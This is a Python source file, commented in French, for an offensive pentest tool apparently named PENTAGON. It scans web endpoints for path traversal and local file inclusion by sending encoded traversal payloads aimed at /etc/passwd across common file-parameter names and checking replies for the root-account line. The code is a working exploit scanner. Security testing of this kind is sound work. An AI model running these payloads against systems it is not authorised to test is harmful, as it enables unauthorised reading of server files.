"""
Outil de test de traversée de répertoire / inclusion de fichier local (LFI)
pour PENTAGON.

Prouve, PAR ATTAQUE RÉELLE mais NON DESTRUCTIVE, qu'un paramètre de type
« fichier » permet de sortir du dossier prévu et de lire des fichiers
arbitraires du serveur (Path Traversal / Local File Inclusion).

Méthode (boîte noire, offensive, bornée à la preuve) :
  1. On cible des endpoints candidats (découverts) + quelques chemins courants
     de téléchargement, et des noms de paramètre « fichier » usuels.
  2. On injecte des charges de traversée pointant vers un FICHIER TÉMOIN neutre
     et universel : `/etc/passwd`.
  3. Si la réponse contient la signature de ce fichier (`root:...:0:0:`), la
     lecture arbitraire est PROUVÉE.

GARDE-FOU « prouver, jamais ravager » : on lit UNIQUEMENT un fichier témoin en
lecture seule (/etc/passwd), jamais de fichier sensible exfiltré ni d'écriture.

Conçu pour être GÉNÉRIQUE : aucune donnée spécifique à une cible.

Catégorie d'action RoE : exploitation (outil offensif).
Standards :
- OWASP A01:2021 (Broken Access Control) / A03 (Injection)
- OWASP WSTG-ATHZ-01 (Testing Directory Traversal / File Include)
- CWE-22 (Path Traversal), CWE-98 (LFI)
- MITRE ATT&CK T1083 (File and Directory Discovery)
"""

import re
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlparse


DEFAULT_TIMEOUT = 15

# Signature d'un /etc/passwd Unix (ligne du compte root).
PASSWD_SIGNATURE = re.compile(r"root:.*?:0:0:")

# Charges de traversée vers le fichier témoin (variantes d'encodage/contournement).
PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
]

# Noms de paramètres « fichier » usuels.
FILE_PARAMS = ["file", "path", "page", "doc", "document", "download",
               "f", "filename", "template", "view", "read", "load", "name"]

# Endpoints de téléchargement/lecture courants (sondés même sans découverte).
COMMON_FILE_PATHS = ["/api/download", "/download", "/api/file", "/file",
                     "/api/read", "/api/view", "/api/static"]

# Mots-clés indiquant qu'un endpoint découvert manipule probablement un fichier.
FILE_HINTS = ("download", "file", "read", "view", "doc", "static", "attachment",
              "export", "report", "template", "page")


def _is_passwd(text: str) -> bool:
    """Vrai si le texte contient la signature d'un /etc/passwd."""
    return bool(text) and bool(PASSWD_SIGNATURE.search(text))


def _base_origin(url: str) -> str:
    """Renvoie l'origine (scheme://host[:port]) d'une URL."""
    p = urlparse(url if url.startswith("http") else f"https://{url}")
    return f"{p.scheme}://{p.netloc}"


def _candidate_endpoints(target_base: str,
                         candidate_urls: list[str] | None) -> list[str]:
    """
    Construit la liste des endpoints à tester : chemins courants + endpoints
    découverts qui ressemblent à de la manipulation de fichier.
    """
    origin = _base_origin(target_base)
    endpoints: list[str] = [origin + p for p in COMMON_FILE_PATHS]
    seen = set(endpoints)

    for url in candidate_urls or []:
        u = url if url.startswith("http") else origin + (url if url.startswith("/") else "/" + url)
        # On retire une éventuelle query existante.
        u = u.split("?", 1)[0]
        low = u.lower()
        if any(h in low for h in FILE_HINTS) and u not in seen:
            endpoints.append(u)
            seen.add(u)

    return endpoints


def run_lfi_test(target_base: str,
                 candidate_urls: list[str] | None = None,
                 token: str | None = None,
                 timeout: int = DEFAULT_TIMEOUT,
                 delay_between_requests: float = 0.5) -> dict[str, Any]:
    """
    Teste la traversée de répertoire / LFI sur des endpoints candidats.

    Returns:
        {
          "status": "success" | "error",
          "tested_endpoints": [...],
          "findings": [{title, severity, affected_endpoint, param, payload,
                        evidence, owasp, cwe, confidence}],
          "vulnerable": bool,
          "error": "..."
        }
    """
    import time
    import requests  # import différé (tool offensif exécuté sur la plateforme)

    result: dict[str, Any] = {
        "status": "success",
        "tested_endpoints": [],
        "findings": [],
        "vulnerable": False,
        "error": None,
    }

    endpoints = _candidate_endpoints(target_base, candidate_urls)
    result["tested_endpoints"] = endpoints
    headers = {"User-Agent": "PENTAGON-Exploitation-Agent/1.0"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    findings: list[dict[str, Any]] = []
    started = datetime.now(timezone.utc)

    for endpoint in endpoints:
        proven = False
        for param in FILE_PARAMS:
            if proven:
                break
            for payload in PAYLOADS:
                try:
                    resp = requests.get(endpoint, params={param: payload},
                                        headers=headers, timeout=timeout,
                                        allow_redirects=False)
                except requests.exceptions.RequestException:
                    continue
                finally:
                    time.sleep(delay_between_requests)

                if _is_passwd(resp.text or ""):
                    snippet = (resp.text or "").strip().splitlines()[0][:120]
                    findings.append({
                        "title": "Traversée de répertoire / LFI (lecture de fichier arbitraire)",
                        "severity": "high",
                        "affected_endpoint": f"{endpoint}?{param}=",
                        "param": param,
                        "payload": payload,
                        "evidence": f"/etc/passwd lu : « {snippet} »",
                        "owasp": "A01:2021 / A03:2021",
                        "cwe": "CWE-22",
                        "confidence": 0.98,
                    })
                    proven = True
                    result["vulnerable"] = True
                    break

    result["findings"] = findings
    result["duration_seconds"] = (datetime.now(timezone.utc) - started).total_seconds()
    return result


if __name__ == "__main__":
    import json
    import sys
    base = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    print(json.dumps(run_lfi_test(base), indent=2, ensure_ascii=False, default=str))
